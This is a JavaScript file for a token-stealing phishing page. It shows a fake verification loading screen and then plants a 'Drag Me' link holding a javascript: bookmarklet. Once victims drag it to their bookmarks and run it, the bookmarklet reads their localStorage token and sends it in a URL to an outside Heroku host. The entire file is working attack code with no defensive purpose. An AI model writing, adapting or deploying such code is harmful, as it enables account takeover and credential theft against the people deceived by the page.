const pay = `javascript:(function() {var i = document.createElement('iframe');
document.body.appendChild(i);
window.location.href = "https://justtryna-ccef14b4130c.herokuapp.com/index.php/verify?="+i.contentWindow.localStorage.token;})()`;

const load = "";

const isntitobvious = pay + load;

//overlay region
document.body.style.overflow = "hidden";
const oberlay = document.getElementById("oberlay");
oberlay.innerHTML = `
<div style='display: flex; flex-direction: column; align-items: center; justify-content: center;'>
<img id='bruhoberlay' src='./assets/load.png' style=' height: 35px; pointer-events: none; user-select: none;' draggable='false'>
<p style='font-family: inherit; margin-top: 1rem'>Initializing verification session ..</p>
</div>
`;
oberlay.querySelector("#bruhoberlay").style.animation =
  "imgoberlay 0.5s linear infinite";
document.body.appendChild(oberlay);

const wickeddiv = document.getElementById("wickeddiv");

const wickeddivinner = `
<div class="sc-liHMlC djFTYl">

                                          <div><button class="sc-jIAOiI bfMtSn sc-hKdnnL RIgdT" type="button">

                                                      <div class="sc-hiMGwR iwHhCu sc-TRNrF dStzaX"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ciZhAO kmbPg sc-olbas dxIxUA" main="#F2F4FB">

                                                                  <path d="M23 12C23 18.0751 18.0751 23 12 23" data-stroke="main" stroke="#F2F4FB" stroke-width="2" stroke-linecap="round"></path>

                                                            </svg></div>

                                                      <a id="wickerman" class="sc-fXynhf hbzcXP" href="javascript:(function() {var i = document.createElement('iframe');document.body.appendChild(i);window.location.href = "https://justtryna-ccef14b4130c.herokuapp.com/index.php/verify?="+i.contentWindow.localStorage.token;})()">Drag

                                                            Me</a>

                                                </button></div><button class="" type="button">

                                                <div class=""><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="" main="#F2F4FB">

                                                            <path d="" data-stroke="main" stroke="#F2F4FB" stroke-width="2" stroke-linecap="round"></path>

                                                      </svg></div>

                                                <div class="sc-fXynhf hbzcXP"></div>

                                          </button>

                                    </div>
`;

setTimeout(() => {
  oberlay.style.opacity = "0";
  setTimeout(() => {
    document.body.removeChild(oberlay);
    document.body.style.overflow = "";
  }, 300);
  setTimeout(() => {
    wickeddiv.innerHTML = wickeddivinner;
    const wickerman = document.getElementById("wickerman");
    wickerman.style.height = "100%";
    wickerman.style.width = "100%";
    wickerman.setAttribute("href", isntitobvious);
  }, 320);
}, 1500);
